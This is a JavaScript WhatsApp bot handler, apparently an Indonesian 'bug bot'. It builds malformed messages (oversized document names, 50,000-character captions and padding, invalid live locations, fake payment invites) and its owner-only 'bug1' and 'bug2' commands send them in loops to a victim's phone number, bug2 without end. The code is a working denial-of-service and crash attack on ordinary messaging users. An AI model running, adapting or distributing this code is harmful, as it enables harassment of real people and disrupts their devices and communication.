require('./config')
const {
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
//=================================================//
//=================================================//
const { cexzasConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header, getLastMessageInChat } = require('@whiskeysockets/baileys')
//=================================================//
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
//=================================================//
//=================================================//
const axios = require('axios')
const os = require('os').cpus().length
const util = require('util')
const urll = require('url')
const jimp = require('jimp')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const pino = require('pino')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const dgram = require('dgram')
const fg = require('api-dylux')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const FormData = require('form-data')
const ms = toMs = require('ms')
const crypto = require("crypto")
const yts = require("yt-search")
const tls = require('tls')
const net = require('net')
const http2 = require('http2')
const cluster = require('cluster')
const { color } = require('./lib/color')
const sockett = dgram.createSocket('udp4')
const bochil = require("@bochilteam/scraper")
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString()
const fs = require('fs')
//=================================================//
//=================================================//
//=================================================//
//=================================================//
module.exports = Cexzas = async (Cexzas, m, chatUpdate, store) => {
var body = (
m.mtype === 'conversation' ? m.message.conversation :
m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === 'messageContextInfo' ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text :
'');
//=================================================//
//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == 'string' ? m.text : '')
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await Cexzas.decodeJid(Cexzas.user.id)
const itsMe = m.sender == botNumber ? true : false
const kontributor = JSON.parse(fs.readFileSync('./lib/owner.json'))
const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const from = mek.key.remoteJid
//=================================================//
//=================================================//
// Group
const groupMetadata = m.isGroup ? await Cexzas.groupMetadata(m.chat).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
//=================================================//
//=================================================//
//=================================================//
//=================================================//
const imagenull = fs.readFileSync(`./lib/image/nulll.jpg`)
const imagenull2 = fs.readFileSync(`./lib/image/nulll2.jpg`)
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
const { state, saveCreds } = await useMultiFileAuthState(`./lib/${global.sessionName}`);
//=================================================//
//=================================================//
//=================================================//
//=================================================//
const force = {
key: {
remoteJid: `status@broadcast`, 
participant: `0@s.whatsapp.net`,
fromMe: false 
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}]}}}}

async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await Cexzas.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `bug`
}
}
}
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//

async function aipong(target) {
await Cexzas.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: Cexzas.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #bugdominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(50000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await Cexzas.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
if (!m.key.isGroup){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await Cexzas.readMessages([readkey]);
}
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
async function ngeloc(target, kuwoted) { 
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `${readmore} ✳️᜴࿆͆᷍🩸⃟༑🩸⃟༑🩸⃟༑🩸⃟༑🩸🩸⃟༑⃟༑⃟🩸⃟༑🩸⃟༑🩸⃟🩸⃟༑🩸⃟༑༑🩸🩸⃟༑⃟༑ดุท้เึางืผิดุท้เึา⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Cexzas.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
const CexzasKece = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: global.packname, participant: '0@s.whatsapp.net'}, message: { 'contactMessage': { 'displayName': `${global.NamaOwner}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${global.NamaOwner};;;\nFN:${global.NamaOwner}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
//=================================================//
const reply = (teks) => {
return Cexzas.sendMessage(m.chat, { text: teks }, { quoted: CexzasKece })
}

let uptime = await runtime(process.uptime())
switch (command) { 
case 'bug1': { 
if (!isDeveloper) return m.reply('Fitur Ini Khusus Owner')
if (!q) return reply(`Contoh : ${prefix+command} 628xxx`)
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await bakdok(victim, force)
await ngeloc(victim, force)}
reply('Sukses Mengirim Bug')}
break
case 'bug2': { 
if (!isDeveloper) return reply('Fitur Ini Khusus Owner')
if (!q) return reply(`Contoh : ${prefix+command} 628xxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
for (;;) {
await aipong(target, force)} 
reply('Sukses')}
break
default:
}}
//=================================================//
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})